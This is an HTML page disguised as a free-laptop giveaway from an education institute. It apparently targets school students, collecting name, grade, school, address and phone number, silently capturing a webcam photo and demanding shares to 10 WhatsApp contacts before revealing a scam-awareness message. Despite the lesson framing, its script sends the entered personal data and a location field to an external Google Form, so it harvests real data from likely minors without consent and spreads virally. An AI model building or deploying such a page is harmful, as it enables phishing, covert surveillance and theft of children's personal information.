<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Win a Free Laptop - Artha Education</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0; padding: 0;
      background: #f5f5f5;
      text-align: center;
    }
    .container {
      max-width: 500px;
      margin: 2rem auto;
      padding: 2rem;
      background: white;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    img.logo {
      width: 100px;
      margin-bottom: 1rem;
    }
    h1, h2 {
      color: #e91e63;
    }
    label {
      display: block;
      margin: 0.5rem 0 0.2rem;
      font-weight: bold;
    }
    input {
      padding: 0.5rem;
      width: 100%;
      margin-bottom: 1rem;
      box-sizing: border-box;
    }
    button {
      padding: 0.75rem 1.5rem;
      background: #2196f3;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 1rem;
      font-size: 1rem;
    }
    #camera, #canvas {
      display: none;
      margin: 1rem 0;
      width: 100%;
    }
    #photoResult {
      max-width: 100%;
      border: 1px solid #ddd;
      margin-top: 1rem;
    }
    #map {
      width: 100%;
      height: 250px;
      margin-top: 1rem;
      border-radius: 10px;
    }
    .final-message {
      display: none;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="container" id="step1">
    <img src="Artha.jpg" alt="Artha Logo" class="logo" />
    <h1>üéÅ Win a Free Laptop!</h1>
    <p>Congratulations! You have been selected by <strong>Artha Education Institute ‚Äì Katulanda</strong>.</p>
    <form id="userForm">
      <label for="name">Full Name / ‡∂±‡∂∏:</label>
      <input type="text" id="name" name="name" required />
      
      <label for="grade">Grade / ‡∑Å‡∑ä‚Äç‡∂ª‡∑ö‡∂´‡∑í‡∂∫:</label>
      <input type="text" id="grade" name="grade" required />
      
      <label for="school">School / ‡∂¥‡∑è‡∑É‡∂Ω:</label>
      <input type="text" id="school" name="school" required />
      
      <label for="address">Address / ‡∂Ω‡∑í‡∂¥‡∑í‡∂±‡∂∫:</label>
      <input type="text" id="address" name="address" required />
      
      <label for="contact">Contact Number / ‡∂Ø‡∑î‡∂ª‡∂ö‡∂Æ‡∂± ‡∂Ö‡∂Ç‡∂ö‡∂∫:</label>
      <input type="text" id="contact" name="contact" required />
      
      <button type="button" onclick="nextStep()">Next</button>
    </form>
  </div>

  <div class="container" id="step2" style="display:none;">
    <h2>üì∑ Camera Permission</h2>
    <p>Camera will be accessed briefly for verification (hidden).</p>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
  </div>

  <div class="container" id="step3" style="display:none;">
    <h2>üì≤ Share with 10 WhatsApp Contacts</h2>
    <p>To receive your gift, share this with 10 WhatsApp friends:</p>
    <p><strong>üéÅ I just claimed a laptop from Artha Institute! You can too!</strong></p>
    <button onclick="finalStep()">I've Shared</button>
  </div>

  <div class="container final-message" id="final" style="display:none;">
    <h2>üö® Don't Fall for Online Scams!</h2>
    <p>You just entered:</p>
    <ul>
      <li><strong>Name:</strong> <span id="showName"></span></li>
      <li><strong>Grade:</strong> <span id="showGrade"></span></li>
      <li><strong>School:</strong> <span id="showSchool"></span></li>
      <li><strong>Address:</strong> <span id="showAddress"></span></li>
      <li><strong>Contact Number:</strong> <span id="showContact"></span></li>
    </ul>
    <p>And shared your <strong>photo</strong> with a fake offer:</p>
    <canvas id="photoResult"></canvas>
    <p style="color:red; font-weight:bold; margin-top:1rem;">
      ‚ùå Don‚Äôt enter real details in random surveys!<br />
      ‚úÖ Learn Cyber Safety with Artha Education Institute.
    </p>
    <div id="map"></div>
  </div>

<script>
  // Google Form submit URL
  const formAction = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";

  // Elements
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const final = document.getElementById('final');

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const photoResult = document.getElementById('photoResult');

  let stream;
  let latitude = null;
  let longitude = null;

  function nextStep() {
    if (!document.getElementById('userForm').reportValidity()) return;

    step1.style.display = 'none';
    step2.style.display = 'block';

    // Start camera and capture photo silently
    startCamera();
  }

  function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(str => {
        stream = str;
        video.srcObject = stream;
        video.play();

        // Wait 2 seconds then capture photo automatically
        setTimeout(() => {
          capturePhoto();
        }, 2000);
      })
      .catch(() => {
        alert('Camera permission denied! You cannot proceed.');
        // Optionally go back to step1
        step2.style.display = 'none';
        step1.style.display = 'block';
      });
  }

  function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop camera
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }

    step2.style.display = 'none';
    step3.style.display = 'block';
  }

  function finalStep() {
    // Show final message with data and photo
    const name = document.getElementById('name').value;
    const grade = document.getElementById('grade').value;
    const school = document.getElementById('school').value;
    const address = document.getElementById('address').value;
    const contact = document.getElementById('contact').value;

    document.getElementById('showName').innerText = name;
    document.getElementById('showGrade').innerText = grade;
    document.getElementById('showSchool').innerText = school;
    document.getElementById('showAddress').innerText = address;
    document.getElementById('showContact').innerText = contact;

    // Draw photo on final canvas
    photoResult.width = canvas.width;
    photoResult.height = canvas.height;
    photoResult.getContext('2d').drawImage(canvas, 0, 0);

    step3.style.display = 'none';
    final.style.display = 'block';

    // Submit form data to Google Form
    submitToGoogleForm({ name, grade, school, address, contact, location: latitude + "," + longitude });

    // Show user location on map
    if (latitude && longitude) {
      showMap(latitude, longitude);
    } else {
      // Try to get location if not captured yet
      getLocation();
    }
  }

  // Submit data to Google Form via fetch
  function submitToGoogleForm(data) {
    const formData = new FormData();
    formData.append('entry.997021349', data.name);
    formData.append('entry.180306948', data.grade);
    formData.append('entry.74488444', data.school);
    formData.append('entry.377707306', data.address);
    formData.append('entry.1450609673', data.contact);
    formData.append('entry.1946665100', data.location);

    fetch(formAction, {
      method: 'POST',
      mode: 'no-cors',
      body: formData
    }).catch(err => console.error('Google Form submit error:', err));
  }

  // Get user's current location
  function getLocation() {
    if (!navigator.geolocation) {
      alert('Geolocation is not supported by your browser');
      return;
    }
    navigator.geolocation.getCurrentPosition(position => {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      showMap(latitude, longitude);
    }, () => {
      alert('Unable to retrieve your location');
    });
  }

  // Show Google Map with user's location
  function showMap(lat, lng) {
    const mapDiv = document.getElementById('map');
    const iframe = document.createElement('iframe');
    iframe.width = "100%";
    iframe.height = "250";
    iframe.style.border = 0;
    iframe.loading = "lazy";
    iframe.allowFullscreen = true;
    iframe.referrerPolicy = "no-referrer-when-downgrade";
    iframe.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
    mapDiv.innerHTML = '';
    mapDiv.appendChild(iframe);
  }
</script>
</body>
</html>
